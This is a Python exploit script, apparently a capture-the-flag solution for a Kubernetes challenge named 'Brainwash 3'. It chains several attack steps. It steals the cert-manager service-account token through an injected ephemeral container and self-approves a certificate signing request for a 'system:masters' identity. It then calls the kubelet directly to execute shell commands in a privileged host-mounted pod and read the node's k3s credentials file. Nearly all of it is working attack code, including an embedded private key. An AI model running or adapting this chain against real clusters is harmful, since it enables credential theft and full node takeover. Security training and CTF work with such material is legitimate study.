#!/usr/bin/env python3
"""Brainwash 3 full chain: steal cert-manager token, mint proxyman cert, exec on the node."""

from __future__ import annotations

import argparse
import base64
import json
import os
import secrets
import socket
import ssl
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

DEFAULT_API = "https://kubernetes.default.svc"
DEFAULT_NAMESPACE = "brainwash-mlops"
SA_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")
CSR_B64 = (
    "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURSBSRVFVRVNULS0tLS0KTUlIck1JR1NBZ0VBTURBeEZ6QVZCZ05W"
    "QkFvTURuTjVjM1JsYlRwdFlYTjBaWEp6TVJVd0V3WURWUVFEREF4dApaV1J2WldRdFlXUnRhVzR3V1RB"
    "VEJnY3Foa2pPUFFJQkJnZ3Foa2pPUFFNQkJ3TkNBQVFLYWQ5ZzVyRWpnKytmCmJrYW1jM2V6MlpyRXJ1"
    "WXp5TCtlVzJZMk9QQ05mTjd3ckNqYWxXQS9SS2ZCdWhDZmlIaldwOGlTNGExZmUrM1QKeGx4c1FvZkVv"
    "QUF3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnSEVXMzlnMzFWVGYxRElhMnpQMnV1UzFJWS85SgpWcnBH"
    "emhwN1hDclg4RkVDSVFERmkrS2dpVEF1K0F1a2YvQW5yeklVTFBHYUxOdGw4VnFYREFBN0ZTdzFUQT09"
    "Ci0tLS0tRU5EIENFUlRJRklDQVRFIFJFUVVFU1QtLS0tLQo="
)
PRIVATE_KEY = """-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIKlB1RoZNwZAP48ZNgQqblqhhNz5cxL3MM/Zm2CyEWs8oAoGCCqGSM49
AwEHoUQDQgAECmnfYOaxI4Pvn25GpnN3s9maxK7mM8i/nltmNjjwjXze8Kwo2pVg
P0SnwboQn4h41qfIkuGtX3vt08ZcbEKHxA==
-----END EC PRIVATE KEY-----
"""


class KubeClient:
    """Minimal Kubernetes JSON client with bearer authentication."""

    def __init__(self, api: str, ca_file: Path, token: str) -> None:
        self.api = api.rstrip("/")
        self.context = ssl.create_default_context(cafile=str(ca_file))
        self.token = token

    def request(
        self,
        path: str,
        method: str = "GET",
        data: dict[str, Any] | None = None,
        content_type: str = "application/json",
        token: str | None = None,
    ) -> tuple[int, str]:
        """Return HTTP status and body, including Kubernetes error bodies."""
        body = json.dumps(data).encode() if data is not None else None
        request = urllib.request.Request(
            self.api + path,
            method=method,
            data=body,
            headers={
                "Authorization": f"Bearer {token or self.token}",
                "Content-Type": content_type,
            },
        )
        try:
            response = urllib.request.urlopen(request, context=self.context, timeout=25)
            return response.status, response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            return error.code, error.read().decode("utf-8", "replace")


def find_cert_manager_mount(pods: list[dict[str, Any]]) -> tuple[str, str]:
    """Find cert-manager-sa's projected service-account token volume."""
    for pod in pods:
        spec = pod.get("spec", {})
        if spec.get("serviceAccountName") != "cert-manager-sa":
            continue
        for volume in spec.get("volumes", []):
            sources = volume.get("projected", {}).get("sources", [])
            if any("serviceAccountToken" in source for source in sources):
                return pod["metadata"]["name"], volume["name"]
    raise LookupError("cert-manager-sa pod/projected token volume not found")


def steal_cert_manager_token(
    client: KubeClient,
    namespace: str,
    image: str,
) -> str:
    """Exfiltrate cert-manager-sa's projected token through a termination message."""
    status, body = client.request(f"/api/v1/namespaces/{namespace}/pods")
    if status != 200:
        raise RuntimeError(f"pod list failed: HTTP {status}: {body[:500]}")
    pod, volume = find_cert_manager_mount(json.loads(body)["items"])
    ephemeral = "cm-" + secrets.token_hex(4)
    patch = {
        "spec": {
            "ephemeralContainers": [
                {
                    "name": ephemeral,
                    "image": image,
                    "command": [
                        "sh",
                        "-c",
                        "cat /sa/token > /dev/termination-log 2>&1",
                    ],
                    "volumeMounts": [{"name": volume, "mountPath": "/sa", "readOnly": True}],
                    "terminationMessagePolicy": "File",
                    "terminationMessagePath": "/dev/termination-log",
                    "securityContext": {
                        "allowPrivilegeEscalation": False,
                        "capabilities": {"drop": ["ALL"]},
                        "runAsNonRoot": True,
                        "runAsUser": 10001,
                        "seccompProfile": {"type": "RuntimeDefault"},
                    },
                }
            ]
        }
    }
    status, body = client.request(
        f"/api/v1/namespaces/{namespace}/pods/{pod}/ephemeralcontainers",
        "PATCH",
        patch,
        "application/strategic-merge-patch+json",
    )
    if status != 200:
        raise RuntimeError(f"token-sidecar patch failed: HTTP {status}: {body[:800]}")
    print(f"[1] injected {namespace}/{pod}:{ephemeral}")
    for _ in range(30):
        time.sleep(2)
        status, body = client.request(f"/api/v1/namespaces/{namespace}/pods/{pod}")
        if status != 200:
            continue
        statuses = json.loads(body).get("status", {}).get("ephemeralContainerStatuses", [])
        for item in statuses:
            terminated = item.get("state", {}).get("terminated")
            if item.get("name") == ephemeral and terminated:
                token = terminated.get("message", "").strip()
                if not token:
                    raise RuntimeError(f"empty token termination message: {terminated}")
                print(f"[1] cert-manager-sa token recovered ({len(token)} bytes)")
                return token
    raise TimeoutError("cert-manager token sidecar did not terminate")


def mint_client_certificate(client: KubeClient, token: str) -> str:
    """Create and self-approve a CSR; the webhook rewrites it to proxyman."""
    name = "proxyman-" + secrets.token_hex(5)
    csr = {
        "apiVersion": "certificates.k8s.io/v1",
        "kind": "CertificateSigningRequest",
        "metadata": {"name": name},
        "spec": {
            "request": CSR_B64,
            "signerName": "kubernetes.io/kube-apiserver-client",
            "usages": ["client auth"],
            "expirationSeconds": 86400,
        },
    }
    path = "/apis/certificates.k8s.io/v1/certificatesigningrequests"
    status, body = client.request(path, "POST", csr, token=token)
    if status not in {200, 201}:
        raise RuntimeError(f"CSR create failed: HTTP {status}: {body[:800]}")
    status, body = client.request(f"{path}/{name}", token=token)
    if status != 200:
        raise RuntimeError(f"CSR get failed: HTTP {status}: {body[:800]}")
    csr_object = json.loads(body)
    csr_object.setdefault("status", {})["conditions"] = [
        {"type": "Approved", "status": "True", "reason": "SelfApproval", "message": "ok"}
    ]
    status, body = client.request(f"{path}/{name}/approval", "PUT", csr_object, token=token)
    if status != 200:
        raise RuntimeError(f"CSR approve failed: HTTP {status}: {body[:800]}")
    for _ in range(20):
        time.sleep(1)
        status, body = client.request(f"{path}/{name}", token=token)
        if status != 200:
            continue
        certificate = json.loads(body).get("status", {}).get("certificate")
        if certificate:
            pem = base64.b64decode(certificate).decode()
            print(f"[2] signed proxyman certificate received from CSR {name}")
            return pem
    raise TimeoutError("approved CSR was not signed within 20 seconds")


def client_tls_context(certificate: str) -> ssl.SSLContext:
    """Build a direct-kubelet TLS context from the minted cert and bundled attack key."""
    cert_file = tempfile.NamedTemporaryFile("w", delete=False)
    key_file = tempfile.NamedTemporaryFile("w", delete=False)
    try:
        cert_file.write(certificate)
        cert_file.close()
        key_file.write(PRIVATE_KEY)
        key_file.close()
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.load_cert_chain(cert_file.name, key_file.name)
        return context
    finally:
        Path(cert_file.name).unlink(missing_ok=True)
        Path(key_file.name).unlink(missing_ok=True)


def dechunk(body: bytes) -> bytes:
    """Decode an HTTP/1.1 chunked body returned by the kubelet."""
    output = bytearray()
    while body:
        line, separator, body = body.partition(b"\r\n")
        if not separator:
            raise ValueError("truncated chunk header")
        size = int(line.split(b";", 1)[0], 16)
        if size == 0:
            return bytes(output)
        if len(body) < size + 2:
            raise ValueError("truncated chunk body")
        output.extend(body[:size])
        body = body[size + 2 :]
    raise ValueError("chunked stream ended without a zero chunk")


def kubelet_get(host: str, context: ssl.SSLContext, path: str) -> bytes:
    """GET a direct kubelet endpoint with the proxyman client certificate."""
    raw = socket.create_connection((host, 10250), timeout=25)
    tls = context.wrap_socket(raw, server_hostname=host)
    try:
        tls.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        response = bytearray()
        while True:
            chunk = tls.recv(65536)
            if not chunk:
                break
            response.extend(chunk)
    finally:
        tls.close()
    headers, separator, body = bytes(response).partition(b"\r\n\r\n")
    if not separator:
        raise ValueError("kubelet returned a malformed HTTP response")
    status = int(headers.split(b"\r\n", 1)[0].split()[1])
    if status != 200:
        raise RuntimeError(f"kubelet GET {path}: HTTP {status}: {body[:500]!r}")
    if b"transfer-encoding: chunked" in headers.lower():
        body = dechunk(body)
    return body


def find_host_mount(pods: list[dict[str, Any]]) -> tuple[str, str, str, str]:
    """Return namespace, pod, container, mount path for privileged hostPath '/'."""
    for pod in pods:
        spec = pod.get("spec", {})
        root_volumes = {
            volume["name"]
            for volume in spec.get("volumes", [])
            if volume.get("hostPath", {}).get("path") == "/"
        }
        if not root_volumes:
            continue
        for container in spec.get("containers", []):
            for mount in container.get("volumeMounts", []):
                if mount.get("name") in root_volumes:
                    security = container.get("securityContext", {}) or {}
                    if security.get("privileged") or pod["metadata"]["name"].startswith(
                        "log-collector"
                    ):
                        return (
                            pod["metadata"]["namespace"],
                            pod["metadata"]["name"],
                            container["name"],
                            mount["mountPath"].rstrip("/"),
                        )
    raise LookupError("no privileged container with hostPath '/' found on the node")


class BufferedSocket:
    """Exact-length reader that preserves bytes received with the WebSocket headers."""

    def __init__(self, sock: ssl.SSLSocket, initial: bytes = b"") -> None:
        self.sock = sock
        self.buffer = bytearray(initial)

    def read(self, size: int) -> bytes:
        """Read exactly size bytes or raise on a truncated frame."""
        while len(self.buffer) < size:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError("WebSocket closed mid-frame")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result


def websocket_exec(
    host: str,
    context: ssl.SSLContext,
    namespace: str,
    pod: str,
    container: str,
    command: str,
) -> str:
    """Execute a shell command via kubelet's v4.channel.k8s.io WebSocket endpoint."""
    params = [
        ("command", "sh"),
        ("command", "-c"),
        ("command", command),
        ("container", container),
        ("output", "1"),
        ("error", "1"),
        ("tty", "0"),
    ]
    query = urllib.parse.urlencode(params)
    path = f"/exec/{namespace}/{pod}/{container}?{query}"
    raw = socket.create_connection((host, 10250), timeout=25)
    tls = context.wrap_socket(raw, server_hostname=host)
    tls.settimeout(25)
    websocket_key = base64.b64encode(os.urandom(16)).decode()
    request = (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {websocket_key}\r\nSec-WebSocket-Version: 13\r\n"
        "Sec-WebSocket-Protocol: v4.channel.k8s.io\r\n\r\n"
    )
    tls.sendall(request.encode())
    received = bytearray()
    while b"\r\n\r\n" not in received:
        received.extend(tls.recv(4096))
    headers, initial = bytes(received).split(b"\r\n\r\n", 1)
    if b" 101 " not in headers.split(b"\r\n", 1)[0] + b" ":
        tls.close()
        raise RuntimeError(f"kubelet WebSocket handshake failed: {headers[:500]!r}")
    reader = BufferedSocket(tls, initial)
    output = bytearray()
    try:
        while True:
            first, second = reader.read(2)
            opcode = first & 0x0F
            masked = bool(second & 0x80)
            length = second & 0x7F
            if length == 126:
                length = int.from_bytes(reader.read(2), "big")
            elif length == 127:
                length = int.from_bytes(reader.read(8), "big")
            mask = reader.read(4) if masked else b""
            payload = bytearray(reader.read(length))
            if masked:
                for index in range(len(payload)):
                    payload[index] ^= mask[index % 4]
            if opcode == 0x8:
                break
            if opcode in {0x1, 0x2} and payload:
                channel = payload[0]
                if channel in {1, 2, 3}:
                    output.extend(payload[1:])
    except (EOFError, TimeoutError):
        pass
    finally:
        tls.close()
    return output.decode("utf-8", "replace")


def main() -> None:
    """Run inside the pod compromised in brainwash."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--api", default=os.environ.get("KUBERNETES_SERVICE_URL", DEFAULT_API))
    parser.add_argument("--namespace", default=DEFAULT_NAMESPACE)
    parser.add_argument("--token-file", type=Path, default=SA_DIR / "token")
    parser.add_argument("--ca-file", type=Path, default=SA_DIR / "ca.crt")
    parser.add_argument("--pod", default=os.environ.get("HOSTNAME", ""))
    parser.add_argument("--image", default="registry.internal.brainwash/base:v1")
    parser.add_argument("--self-test", action="store_true")
    args = parser.parse_args()
    if args.self_test:
        from cryptography import x509
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import ec
        from cryptography.x509.oid import NameOID

        csr = x509.load_pem_x509_csr(base64.b64decode(CSR_B64))
        private_key = serialization.load_pem_private_key(PRIVATE_KEY.encode(), password=None)
        csr_key = csr.public_key()
        assert isinstance(csr_key, ec.EllipticCurvePublicKey)
        assert isinstance(private_key, ec.EllipticCurvePrivateKey)
        assert csr_key.public_numbers() == private_key.public_key().public_numbers()
        assert csr.subject.get_attributes_for_oid(NameOID.ORGANIZATION_NAME)[0].value == (
            "system:masters"
        )
        assert dechunk(b"4\r\ntest\r\n0\r\n\r\n") == b"test"
        fixture = [
            {
                "metadata": {"namespace": "kube-system", "name": "log-collector-x"},
                "spec": {
                    "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
                    "containers": [
                        {
                            "name": "collector",
                            "securityContext": {"privileged": True},
                            "volumeMounts": [{"name": "host", "mountPath": "/host"}],
                        }
                    ],
                },
            }
        ]
        assert find_host_mount(fixture) == (
            "kube-system",
            "log-collector-x",
            "collector",
            "/host",
        )
        print("self-test: OK")
        return
    if not args.pod:
        parser.error("--pod or $HOSTNAME is required")

    client = KubeClient(args.api, args.ca_file, args.token_file.read_text().strip())
    cert_manager_token = steal_cert_manager_token(client, args.namespace, args.image)
    certificate = mint_client_certificate(client, cert_manager_token)
    context = client_tls_context(certificate)

    status, body = client.request(f"/api/v1/namespaces/{args.namespace}/pods/{args.pod}")
    if status != 200:
        raise RuntimeError(f"cannot resolve current node: HTTP {status}: {body[:500]}")
    own_pod = json.loads(body)
    host = own_pod.get("status", {}).get("hostIP")
    if not host:
        raise ValueError("current pod has no status.hostIP")
    pods = json.loads(kubelet_get(host, context, "/pods"))["items"]
    namespace, pod, container, mount = find_host_mount(pods)
    print(f"[3] node={host}; target={namespace}/{pod}:{container}; host root={mount}")
    command = (
        f"cat {mount}/flag.txt; echo; echo ===K3S-CONFIG===; cat {mount}/etc/rancher/k3s/k3s.yaml"
    )
    output = websocket_exec(host, context, namespace, pod, container, command)
    print(output)
    if "avito{" not in output:
        raise RuntimeError("node exec completed without flag3")


if __name__ == "__main__":
    main()
